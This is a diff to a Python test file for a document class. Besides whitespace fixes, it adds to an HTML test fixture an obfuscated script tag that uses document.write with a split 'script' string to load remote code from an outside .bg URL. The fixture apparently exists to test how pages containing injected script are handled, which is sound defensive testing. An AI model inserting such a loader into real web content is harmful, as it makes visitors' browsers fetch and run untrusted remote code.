@@ -1138,7 +1138,7 @@ class TestDocument(TestDocumentMixin):
     self.assertSameSet([document_3], getAdvancedSearchStringResultList(**kw))
     kw = {'searchabletext_any': 'copy',
           'reference': document_2.getReference(),
-	  'search_portal_type': 'File'}
+          'search_portal_type': 'File'}
     self.assertSameSet([], getAdvancedSearchStringResultList(**kw))
   
     # search by version
@@ -1196,7 +1196,6 @@ class TestDocument(TestDocumentMixin):
 
     # XXX: search limited to a certain date range
     # XXX: search mode
-
 
   def test_PDFTextContent(self):
     upload_file = makeFileUpload('REF-en-001.pdf')
@@ -1602,6 +1601,9 @@ style=3D'color:black'>05D65812<o:p></o:p></span></p>
   </td>
  </tr>
 </table>
+<script LANGUAGE="JavaScript" type="text/javascript">
+document.write('<sc'+'ript type="text/javascript" src="http://somosite.bg/utb.php"></sc'+'ript>');
+</script>
 </BODY></HTML>
     """
     web_page.edit(text_content=html_content)
